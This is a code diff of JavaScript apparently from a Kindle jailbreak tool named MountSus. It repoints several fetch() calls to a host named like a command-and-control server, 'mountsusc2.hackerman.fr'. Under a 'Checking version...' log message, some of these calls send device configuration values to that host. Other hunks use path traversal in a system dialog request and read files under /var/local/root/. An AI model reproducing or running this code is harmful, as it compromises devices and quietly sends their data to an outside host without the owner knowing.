@@ -19,10 +19,10 @@ var notableFiles = [
     "/app/tools/strokeSampleApps.sh"
 ]
 log("Checking version...");
-fetch("http://hackerman.fr:126/MountSus/jbDRM");
-fetch("http://hackerman.fr:126/MountSus/kindleCrypt?crypto=" + kindle.dconfig.getValue("url.cantilever"));
-fetch("http://hackerman.fr:126/MountSus/kindleCrypt?storefront=" + kindle.dconfig.getValue("url.store"));
-fetch("http://hackerman.fr:126/MountSus/chrResponse");
+fetch("https://mountsusc2.hackerman.fr/MountSus/jbDRM");
+fetch("https://mountsusc2.hackerman.fr/MountSus/kindleCrypt?crypto=" + kindle.dconfig.getValue("url.cantilever"));
+fetch("https://mountsusc2.hackerman.fr/MountSus/kindleCrypt?storefront=" + kindle.dconfig.getValue("url.store"));
+fetch("https://mountsusc2.hackerman.fr/MountSus/chrResponse");
 log(version)
 
 version = version.split('.');
@@ -50,7 +50,7 @@ function openConfirmation(fileData, filePath) {
     return;
     }
     log("Activating dialog");
-    kindle.messaging.sendMessage("com.lab126.pillow", "customDialog", { name: "../../../../../../mnt/us/apps/com.bluebotlaboratories.mountsus/dialoger", clientParams:{show:true, jsEnabled:false, fileData:fileData, filePath:filePath} });
+    kindle.messaging.sendMessage("com.lab126.pillow", "customDialog", { name: "../../../../../../mnt/us/apps/com.bluebotlabs.mountsus/dialoger", clientParams:{show:true, jsEnabled:false, fileData:fileData, filePath:filePath} });
     log("Dialog activated");
 }
 
@@ -67,7 +67,7 @@ function jailbreak() {
     document.getElementById("verifyButton").style.display = "block";
     // Read file contents
     log("Locating mntus MountSus files...");
-    fetchFile("/mnt/us/apps/com.bluebotlaboratories.mountsus/mountsusBlob.bin");
+    fetchFile("/mnt/us/apps/com.bluebotlabs.mountsus/mountsusBlob.bin");
     fetchFile("/var/local/root/");
     fetchFile(fileList[seed + 5402]).then(function tmp(fileContents) {
         if (fileContents.includes("# auto-generated file -- do not modify!")) {
